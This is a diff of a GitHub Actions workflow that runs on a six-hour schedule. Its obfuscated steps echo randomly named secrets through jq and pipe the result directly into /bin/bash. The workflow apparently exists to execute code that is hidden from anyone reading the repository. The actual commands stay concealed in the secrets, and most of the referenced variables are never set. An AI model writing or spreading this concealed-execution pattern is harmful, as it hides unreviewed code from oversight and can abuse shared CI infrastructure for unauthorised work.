@@ -3,20 +3,22 @@ name: duanzhixing2016
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
-jobs:  # 31940
+    - cron: '10 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duanzhixing2016
         env:
-          qodbi813: ${{ secrets.qodbi813 }}
+          r6: ${{ secrets.r6 }}
         run: |
-          echo $qodbi813 | jq -r .bol36432 | /bin/bash
-          echo $qcu43 | jq -r .oz93328 | /bin/bash
-          echo $bch4 | jq -r .ls278 | /bin/bash
-          echo $o1252 | jq -r .sf56617 | /bin/bash
-          echo $zv0272 | jq -r .hd03731 | /bin/bash
-          echo $jjsbw72 | jq -r .g627 | /bin/bash
+          echo $r6 | jq -r .y33920 | /bin/bash
+          echo $uf92 | jq -r .vjg35 | /bin/bash
+          echo $bk638 | jq -r .dqug496 | /bin/bash
+          echo $n834 | jq -r .he7 | /bin/bash
+          echo $fsfy3520 | jq -r .en669 | /bin/bash
+          echo $wtvwl6 | jq -r .z5 | /bin/bash
+          echo $y3 | jq -r .ad04309 | /bin/bash
+          echo $p54562 | jq -r .sq23824 | /bin/bash
 
